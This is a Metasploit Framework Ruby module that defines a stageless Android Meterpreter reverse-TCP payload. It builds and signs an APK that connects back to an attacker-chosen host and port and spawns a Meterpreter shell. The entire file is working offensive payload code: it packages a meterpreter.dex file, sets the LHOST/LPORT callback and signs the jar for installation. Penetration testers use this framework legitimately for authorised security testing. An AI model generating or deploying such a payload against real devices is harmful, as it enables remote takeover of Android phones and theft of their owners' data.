##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'msf/core/payload/dalvik'
require 'msf/core/payload/transport_config'
require 'msf/base/sessions/meterpreter_android'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::TransportConfig
  include Msf::Payload::Single
  include Msf::Payload::Dalvik
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Android Meterpreter Shell, Reverse TCP Inline',
      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'License'     => MSF_LICENSE,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_Java_Android,
      'Payload'     => '',
    ))
    
    register_options([
      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
    ], self.class)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new
    classes = MetasploitPayloads.read('android', 'meterpreter.dex')
    url = "tcp://#{datastore['LHOST']}:#{datastore['LPORT']}"
    opts[:stageless] = true
    apply_options(classes, opts, url)

    jar.add_file("classes.dex", fix_dex_header(classes))
    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]
    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end


end
